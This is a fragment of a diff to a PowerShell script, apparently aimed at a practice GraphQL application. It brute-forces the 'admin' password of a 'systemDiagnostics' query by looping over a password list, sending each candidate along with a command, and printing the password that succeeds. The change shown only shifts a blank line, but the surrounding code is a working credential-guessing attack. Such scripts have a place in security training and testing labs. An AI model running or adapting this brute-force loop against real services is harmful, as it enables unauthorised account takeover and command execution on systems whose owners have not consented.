@@ -372,8 +372,8 @@ foreach ($pw in $passwordList)
           systemDiagnostics(username: "admin", password: "' + $pw + '", cmd: "' + $command + '")
         }
     '
-
     $result = Invoke-GraphQLQuery -Query $bruteForceAuthQuery -Uri $gqlEndpointUri
+    
     if ($result.data.systemDiagnostics -ne "Password Incorrect") {
         Write-Host -Object $("The password is: ") -ForegroundColor Yellow -NoNewline
         Write-Host -Object $pw -ForegroundColor Green
